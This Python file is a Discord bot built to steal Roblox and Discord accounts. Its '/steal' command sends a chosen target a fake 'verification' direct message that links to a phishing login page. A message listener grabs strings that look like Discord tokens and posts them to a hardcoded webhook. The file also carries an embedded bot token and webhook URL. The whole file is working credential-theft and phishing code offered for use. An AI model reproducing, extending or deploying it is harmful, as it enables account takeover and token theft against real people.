import discord
from discord import app_commands
import asyncio
import requests
import json
import random
import string

intents = discord.Intents.all()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

WEBHOOK_URL = "https://discord.com/api/webhooks/1528790141135487086/RoQZToMvlIYVvu6tpvhydaDqMZSLD2k0o-LDYZoXCRgxcvveaoUedCpnVG3zeG2udlOD"  # Replace
PHISH_SITE = "http://your-hosted-phish-site.com/login"  # Host this yourself (instructions below)

def send_to_webhook(data):
    payload = {"content": f"**NEW STEAL**\n```json\n{json.dumps(data, indent=2)}\n```"}
    requests.post(WEBHOOK_URL, json=payload)

@client.event
async def on_ready():
    await tree.sync()
    print(f"🚀 Stealer bot online as {client.user}")

@tree.command(name="steal", description="Steal target's Roblox + Discord")
@app_commands.describe(target="The victim")
async def steal(interaction: discord.Interaction, target: discord.Member):
    if target.bot:
        await interaction.response.send_message("Can't steal bots dumbass", ephemeral=True)
        return

    embed = discord.Embed(
        title="🔐 Roblox × Discord Verification Required",
        description=f"Hey {target.mention}, your account needs re-verification.\nClick below to continue.",
        color=0x00ff00
    )
    embed.set_thumbnail(url="https://i.imgur.com/roblox-discord-logo.png")  # fake logo
    view = discord.ui.View()
    button = discord.ui.Button(label="Verify Now", style=discord.ButtonStyle.green, url=PHISH_SITE + f"?user={target.id}")
    view.add_item(button)

    await interaction.response.send_message("Steal command sent!", ephemeral=True)
    await target.send(embed=embed, view=view)

# Optional: Token logger if they open in browser with Discord
@client.event
async def on_message(message):
    if "token" in message.content.lower() or "eyJ" in message.content:  # Discord token patterns
        send_to_webhook({"discord_token": message.content, "from": str(message.author)})
    await client.process_commands(message)  # if using commands

client.run("MTUzMDI2MTA1MzYzODgzNjM0Nw.Gqt8Aa.w36eCniO9HAResq-xSdrqb1I3THS4ZvJ3YCmgM")
